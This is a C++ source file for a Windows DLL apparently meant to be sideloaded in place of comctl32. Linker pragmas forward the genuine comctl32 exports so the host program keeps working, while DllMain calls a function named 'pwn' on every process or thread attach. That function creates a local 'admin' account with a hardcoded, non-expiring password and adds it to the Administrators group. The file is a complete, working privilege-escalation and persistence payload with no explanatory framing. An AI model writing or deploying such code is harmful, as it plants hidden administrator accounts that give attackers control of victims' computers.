#include "pch.h"
#pragma comment(linker, "/EXPORT:InitCommonControls=c:/Windows/WinSxS/x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.1110_none_c0da534e38c01f4d/comctl32.InitCommonControls,@17,NONAME")
#pragma comment(linker, "/EXPORT:ImageList_Destroy=c:/Windows/WinSxS/x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.1110_none_c0da534e38c01f4d/comctl32.ImageList_Destroy,@44")
#pragma comment(linker, "/EXPORT:ImageList_Create=c:/Windows/WinSxS/x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.1110_none_c0da534e38c01f4d/comctl32.ImageList_Create,@43")
#pragma comment(linker, "/EXPORT:ImageList_AddMasked=c:/Windows/WinSxS/x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.1110_none_c0da534e38c01f4d/comctl32.ImageList_AddMasked,@40")

#include <LM.h>
#pragma comment(lib, "netapi32.lib")

void pwn()
{
	wchar_t username[] = L"admin";
	wchar_t password[] = L"P@ssw0rd1!@#$";
	wchar_t group[] = L"Administrators";
	USER_INFO_1 userinfo;
	memset(&userinfo, 0, sizeof(USER_INFO_1));
	userinfo.usri1_name = username;
	userinfo.usri1_password = password;
	userinfo.usri1_priv = USER_PRIV_USER;
	userinfo.usri1_flags = UF_DONT_EXPIRE_PASSWD;
	NetUserAdd(NULL, 1, (LPBYTE)&userinfo, NULL);


	LOCALGROUP_MEMBERS_INFO_3 members;
	members.lgrmi3_domainandname = username;
	NetLocalGroupAddMembers(NULL, group, 3, (LPBYTE)&members, 1);
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH: {
		pwn();
		break;
	}
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return FALSE;
}